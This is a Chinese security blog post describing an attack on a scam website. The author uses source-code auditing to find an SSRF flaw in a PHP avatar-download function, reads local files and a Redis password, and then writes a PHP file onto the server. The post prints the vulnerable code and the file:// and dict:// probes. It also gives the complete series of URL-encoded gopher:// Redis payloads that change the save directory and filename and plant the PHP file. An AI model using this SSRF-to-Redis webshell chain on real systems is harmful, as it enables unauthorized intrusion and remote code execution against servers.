> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/NerqhGhJbIuyjXQWjm88qg)

### 起因

前段时间项目中遇到一个杀猪盘，一直很忙没有看，最近闲下来就看了一下，没发现什么明显的漏洞，就在`Fofa`上通过特征搜了一批同类型的站扫源码备份，运气很好，扫到一份

### SSRF

本来找到一处任意上传，但是在目标上面已经被删除，只能继续看代码   
在全局搜索`curl`的时候发现在`\lib\controller\api\user.php`文件的`_downloadAvatarFromThird`私有方法里面有定义 

![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV05LkDv55PHKnWPhx84tqNibnDWbTgUZkGwZK2NKe98LZBLTH4wtEJM5eQ/640?wx_fmt=png)

1.  在 279 到 282 行没有任何过滤直接把传进来的`$thirdAvatarUrl`使用`curl`进行请求并把返回结果存储在`$imageData`
    
2.  在 284 行通过`getAvatarFilename`方法获取到一个基于以微秒计的当前时间然后拼接`.jpg`的文件名
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV05447djc8FxdpaDp7VL17hFbeQChBIvEspBdXsxNaEafJ4WOnxkWrTRw/640?wx_fmt=png)
    
3.  在 285 行通过`getAvatarUrl`方法获取到一个本地存储的绝对路径
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV0517knjhWnVibbXEAnQUOCXFSUZ3n9SjKDqxnBwSerJhoIkIWDtLvqDyA/640?wx_fmt=png)
    
    > `S_ROOT`在`/index.php`里被定义为当前网站根目录的绝对路径![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV05wcP7y91CDQ7FWg9GvqLNETImycOtR5aLbs5XKtFeYR7yccklfXDVEg/640?wx_fmt=png)
    
4.  在 294 行把结果写入到第 285 行获取到的文件名里
    

现在知道了`_downloadAvatarFromThird`方法有明显的`SSRF`漏洞并把结果写入到一个文件里面之后，只需要找到哪里调用的这个方法，然后看看`$thirdAvatarUrl`变量是否可控   
通过搜索，在第 139 行的公开方法`thirdPartyLogin`里面调用了`_downloadAvatarFromThird`方法，并且`$thirdAvatarUrl`也是可控的

```
/**
 * 第三方登录 qq 微信
 * @method POST /index.php?m = api&c = user&a = registerMachine
 * @param flag string 入口标示
 * @param code string 机身码
 * @return json
 */
public function thirdPartyLogin (){

 log_to_mysql(runtime(),'thirdPartyLogin_start');

 $this->checkInput($_REQUEST, array('openid','nickname','type','flag', 'code'), 'all');


 log_to_mysql(runtime(),'thirdPartyLogin_check_params_end');

 $openid = trim($_REQUEST['openid']);
 $nickname = trim($_REQUEST['nickname']);
 $avatar = trim($_REQUEST['avatar']);
 $type = trim($_REQUEST['type']);
 $flag = trim($_REQUEST['flag']);
 $code = trim($_REQUEST['code']);
 if(!in_array($type,array(5,6,7))){
  ErrorCode::errorResponse(ErrorCode::DB_ERROR);
 }

 //获取IP地址及ip归属地
 $ipData = getIp();
 log_to_mysql(runtime(),'thirdPartyLogin_getip_end');

 $sql = "SELECT user_id FROM `un_user_third` WHERE `openid` = '{$openid}' AND `type` = '{$type}'";
 $res = O('model')->db->getOne($sql);
 log_to_mysql(runtime(),'thirdPartyLogin_checkOpenidExists_end');

 if(empty($res['user_id'])){
  $username = $this->getUsername(6,10);
  //添加用户
  $data = array(
   'username' => $username,
   'nickname' => $nickname,
   'regtime' => SYS_TIME,
   'birthday' => SYS_TIME,
   'regip' => $ipData['ip'],
   'reg_ip_attribution' => $ipData['attribution'],
   'loginip' => $ipData['ip'],
   'login_ip_attribution' => $ipData['attribution'],
   'logintime' => SYS_TIME,
   'logintimes' => 1,
   'reg_type' => $type,
   'entrance' => $flag,
   'layer_id' => $this->model2->getDefaultLayer()
  );

  $userId = $this->model->add($data);

  if (!$userId) {
   ErrorCode::errorResponse(ErrorCode::DB_ERROR);
  }

  //添加资金账户
  $map = array(
   'user_id' => $userId,
   'money' => 0
  );
  $this->model2->add($map);

  O('model')->db->query("INSERT INTO `un_user_tree` (`user_id`, `pids`, `layer`) VALUES ({$userId}, ',', 1)");

  //添加第三方数据表记录
  $sql2 = "INSERT INTO `un_user_third` (`user_id`, `openid`, `type`, `addtime`) VALUES ('{$userId}', '{$openid}', '{$type}', '{$data['regtime']}')";
  O('model')->db->query($sql2);

  //下载头像
  if(!empty($avatar)){
   $res = $this->_downloadAvatarFromThird($userId, $avatar);
  }

  //设置登录信息
  $this->loginLog($userId, $flag, $code);

  $token = $this->setToken($userId,$code);
  $data = array(
   'uid' => $userId,
   'token' => $token,
   'username' => $username,
   'nickname' => $nickname,
   'avatar' => $res?$res:'/up_files/room/avatar.png',
   'state' => 1
  );
 }else{
  $userId = $res['user_id'];
  $sql = "SELECT id,username,nickname,avatar,password FROM un_user WHERE id = '" . $userId ."' AND state IN(0,1)";
  $userInfo = O('model')->db->getOne($sql);

  log_to_mysql(runtime(),'thirdPartyLogin_getUserInfo_end');

  if (empty($userInfo)) {
   ErrorCode::errorResponse(ErrorCode::PHONE_OR_PWD_INVALID);
  }
  //更新登录信息
  $this->model->updateLoginInfo($userId);
  log_to_mysql(runtime(),'thirdPartyLogin_updateLogData_end');

  //去掉更新设备，这里更新的设备字段，为注册设备，最后登录设备已记录在 un_user_login_log 表
  // $this->model->save(array('entrance' => $flag), array('id' => $userId)); //更新用户设备登录类型

  //设置登录信息
  $token = $this->setToken($userId,$code);


  log_to_mysql(runtime(),'thirdPartyLogin_setToken_end');

  $this->loginLog($userId, $flag, $code);

  log_to_mysql(runtime(),'thirdPartyLogin_logLoginData_end');

  $data = array(
   'uid' => $userId,
   'token' => $token,
   'username' => $userInfo['username'],
   'nickname' => empty($userInfo['nickname']) ? $userInfo['username'] : $userInfo['nickname'],
   'avatar' => empty($userInfo['avatar']) ? '/up_files/room/avatar.png' : $userInfo['avatar'],
   'state' => empty($userInfo['password']) ?1:2
  );
 }

 /*
 $honor = get_honor_level($userId);
 if(($honor['status1'] && $honor['status']) || ($honor['status'] && $honor['score']==0)){
  $data['honor'] = $honor['name'];
  $data['icon'] = $honor['icon'];
  $data['num'] = $honor['num'];
 }else{
  $data['honor'] = 0;
 }
 */

 //荣誉机制
 $data['honor'] = get_honor_info($userId);

 log_to_mysql(runtime(),'thirdPartyLogin_getHonor_end');

 ErrorCode::successResponse($data);
}
```

那么现在就可以构造一个 URL 来读文件试一下是否可以成功

![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV05ibNyq426YEQxZzeqtGjibCPhWicWUzGCfaxgEfwib7cZONrq7PJ31K8Ilw/640?wx_fmt=png)

返回了图片路径就说明是读成功了的

![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV05VCER3LVibrdud6ia8h4mt7qhibmdfUicPr7OLeJlCoNicXd5pv0upFVzfjg/640?wx_fmt=png)

> 经过测试支持`file`、`http/s`、`dict`、`gopher`等协议

#### 写 shell 失败

读文件并不是我的目标，最终的目的是要拿到权限   
在之前在看配置文件的时候看到配置文件里面是配置了`Redis`密码的，但是并不清楚目标上是否开启，读到`/etc/passwd`之后看到有`redis`用户，那么八成是开启了的   
这时候首先需要看一下目标机器上面的`Redis`是否配置了密码：`dict://127.0.0.1:6379/info`   
查看返回结果发现是配置了密码的  

![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV05HpICBNgOyDvV9w8sYZNnkA1Tkgzb7EVVF2L2KtTdeicdpe64yrWR8EQ/640?wx_fmt=png)

这时候有两个思路获取到`Redis`密码：  

*   爆破`Redis`密码：`dict://127.0.0.1:6379/auth:<password>`
    
*   找绝对路径读配置文件
    

首选肯定是先找找看能否爆出来绝对路径，发现有两个文件有可能泄露绝对路径：

*   `/caches/log/object_error.php` （目标上不存在）
    
*   `/chat/workerman.log`：访问下载下来后，不出意外的泄露了绝对路径
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV05STl0uAA6gicfWylcv3O0cVrdTxye1PBQuNyWic8Wd6ZpLMb2pyDjpT7Q/640?wx_fmt=png)
    
    再通过`SSRF`读配置文件得到`Redis`的密码：`file:///www/wwwroot/webgz/caches/config.php` 
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV05gFEYoD0RU9Ne3NxX32PWic9KdpIPEriay5G1xicib92eXfZ0YJHfPbOTrg/640?wx_fmt=png)
    
    得到密码之后怎样在非交互模式下使用密码进行验证并且执行指令呢？可以在`Redis`官方文档中找到答案：`https://redis.io/topics/pipelining`
    

*   大概意思就是`Redis`支持非传统一次`request`等待一次`response`的模式，可以发送多条`request`后再一次性接收所有`response`
    

这个时候`dict`协议就不行了，因为`dict`协议会自动在结尾补上`\r\n`(`CRLF`)，不能一次发出多条指令，所以这里需要使用`gopher`协议

> 把`Redis`命令转换为`gopher`协议：
> 
> *   先使用`socat`转发流量并打印文本`socat -v tcp-listen:6378,fork tcp-connect:localhost:6379`
>     
> *   然后使用`redis-cli`攻击 6378 端口`redis-cli -h 127.0.0.1 -p 6378 -a qq123456 config get dir`
>     
>     ![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV05ibxlUGCt30XoC1248MgM8ibZicMQHzJKGqsN5kBtSJH046NvPm71KtemA/640?wx_fmt=png)
>     
> 
> 这时候是可以发现一些规律的（也就是 RESP 协议，可以百度了解）
> 
> 转换：
> 
> *   如果第 1 个字符是`>`或者`<` 那么丢弃该行字符串，表示请求和返回的时间和流量详情。
>     
> *   删除从`<`开头的行到`>`开头的行之间的行，因为这是返回的数据，这里不需要
>     
> *   将`\r换行`字符串替换成`%0d%0a`
>     
> *   开头为`*`的数字为数组元素数量，开头为`$`的数字为字符数量，也就是说`*3`后面需要跟 3 个`$x`
>     
> *   `Gopher`协议发送数据第一个字符会消失，所以用`_`来代替第一个字符（其他字符也都可以）
>     

那么这里需要认证的`config get dir`转换为`gopher`协议就是

```
gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*3%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aget%0d%0a$3%0d%0adir%0d%0a
```

后面必须再加一个`quit`（`*1%0d%0a$4%0d%0aquit%0d%0a`），否则会一直连接，不退出，也就无法返回结果   
发送前再把`_`后面的所有内容再`url`编码一次，发送并得到结果  

![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV05rhBGNowxTcGrI05fRlIkqdOZKAia2cTC1JawHYh31apTzIg1H4YhFibg/640?wx_fmt=png)

现在就可以通过`Redis`往目标网站写一个`webshell`了  

1.  首先需要关闭`RDB`压缩，`Redis`默认开启，如果不关闭，字符串可能会被压缩出现乱码导致`shell`不能正常运行：`*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$14%0d%0ardbcompression%0d%0a$2%0d%0ano%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a`   
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV05ghbI6VlibjTrzGhUevVgqX0JiaCFjXsCibTXvJhnV9phmXnyvxR5ll5kQ/640?wx_fmt=png)
    
    又开始有回显了
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV0580ZIzedCTAibIUlamvX6fXIh8ibKsc0aJQnibJeNSBRnq1zWgWPjVR0Zg/640?wx_fmt=png)
    
2.  设置保存位置：`*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$35%0d%0a/www/wwwroot/webgz/up_files/avatar/%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a` 
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV05U1FHR3RRaarnTTgE4Ns8ZibsugBMasicoEiblhN2h6HFMl4iczUumQv5NQ/640?wx_fmt=png)
    
    > 在设置保存路径之前，最好先获取一下原本的保存路径，写入`shell`之后恢复回去：`*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*3%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aget%0d%0a$3%0d%0adir%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a`
    
3.  设置文件名：`*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$5%0d%0a1.php%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a` 
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV05icBibjnAkibnpLswcE65UiaNicBgNFApCiaJU6ou3gH3jG9MeACpFDJsotrg/640?wx_fmt=png)
    
4.  写入一个`key`，内容为`wenshell`：`*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0as%0d%0a$27%0d%0a%0a%0d%0a<?php phpinfo();?>%0d%0a%0a%0d%0a%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a` 
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV05W670yYawq4nX4a3Tdem9gbBklwvjGiaeobtvrs9iaJRoKD3Z4ia1aIeCw/640?wx_fmt=png)
    
5.  保存：`*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a` 
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV050xPdtjlc0u7xENPORhAPLjBMUHxdWDeZSTkibU140o0gjicuo5tvs0Kw/640?wx_fmt=png)
    

发现没有写进去，目标机器为`Linux`，猜测是权限的问题（可能网站路径都是`755`，而`redis`权限想写进去最后一位权限得是`7`(读写执行)、`6`(写执行)）   
那么这个时候有几个选择：

*   试一下定时任务有没有写权限（测试没权限）
    
*   多找几个目录试试看有没有`777`权限目录（没找到）
    
*   在源码里搜索一下是否有`chmod`、`mkdir`等方法赋予了`777`权限
    
*   `Fastcgi`（攻击方法参考`https://bbs.ichunqiu.com/thread-58455-1-1.html`），但是这里不知道是走的`socket`还是`TCP`（默认`socket`），所以没测试
    

### 突破

1.  找到一些`chmod`、`mkdir`要不就是不可控，要不就是目录已经存在   
    最后在`\core\class\upload.php`的`upload`方法里找到使用`chmod`方法会以当前日期新建一个目录并赋予`777`权限   
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV05CiaGwlibt98rXzic7odFmY5LDD4u3LtNA4LSg5AqW93aeg4P1Sor1sXoA/640?wx_fmt=png)
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV05WQNtUXqlEezNQ59Aw4xsJSEV2zhSuN82icuUSE3f09p2C0ufPMktCIg/640?wx_fmt=png)
    
2.  搜索调用了`upload`类的并可控的点   
    在`\lib\controller\attachment\attachment.php`的公开方法`upload`里调用了`upload`类，并且可控 
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV05SEybsLAh7c93nh8IyDlfXPT1SfeWcTejZfibSgRalRCkiaglphdicpdYw/640?wx_fmt=png)
    
3.  构造上传 
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV05HQcBVJqkpMk06IIyVd2J2aQt5dTcFOKicDtMib5zY0JoLPBGsSIeLFwg/640?wx_fmt=png)
    
    上传成功，返回了路径   
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV059lNogYK5J6iaYQGETL6Z0WDdwG9o6p0Fich5VzRptMevYL5X35KhOoRw/640?wx_fmt=png)
    
    成功访问到，那么这个新建的目录`up_files/avatar/2021/0315/`就是`777`权限，可以通过`redis`写入`webshell`了  
    
4.  再用`redis`写`webshell`发现`<`和`>`被实体化了，那么把这两个都再进行一次`url`编码即可
    

*   `*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$14%0d%0ardbcompression%0d%0a$2%0d%0ano%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a`
    
*   `*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$45%0d%0a/www/wwwroot/webgz/up_files/avatar/2021/0315/%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a`
    
*   `*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$5%0d%0a1.php%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a`
    
*   `*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0as%0d%0a$26%0d%0a%0a%0d%0a%3C?php phpinfo();?%3E%0d%0a%0a%0d%0a%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a`
    
*   `*2%0d%0a$4%0d%0aAUTH%0d%0a$8%0d%0aqq123456%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a`
    

7.  访问   
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BkM2kb8AljhjQhe4bSPJt3GmcNAUBV05KY9PDkhvYpBqradpO7cQtQo2p3Q5y15icV1jlVIGGKBlQXR0nStNZ2Q/640?wx_fmt=png)成功，把`redis`配置给他改回去都可以了。
    

**新增  
**

**重生信息安全公众号→菜单栏→公检合作→公检法合作**

**福利**

**本文留言点赞第一送出安全书籍盲盒一个截止时间 2021-5-25-18.00**

![](https://mmbiz.qpic.cn/mmbiz_gif/B0Ov264SNIIjeG1nUThibTFN6DRNDtGT7endzn6sEeFPPJ9l0YuWNltcsD1ia5D9TBwn9bwVn61YuLh1YetIFXEg/640?wx_fmt=gif)

点分享

![](https://mmbiz.qpic.cn/mmbiz_gif/B0Ov264SNIIjeG1nUThibTFN6DRNDtGT7YGzlxzZ4LT3cQyPyam7lswKTUE1XbicMzD7yxGV9Fe7mP3d3Nrbup7w/640?wx_fmt=gif)

点点赞

![](https://mmbiz.qpic.cn/mmbiz_gif/B0Ov264SNIIjeG1nUThibTFN6DRNDtGT7ZXibYCtiba6HVx71LdjPicsn10FKhxkSpibuDldMXS7iaXwqyFbIWHiaCUIg/640?wx_fmt=gif)

点在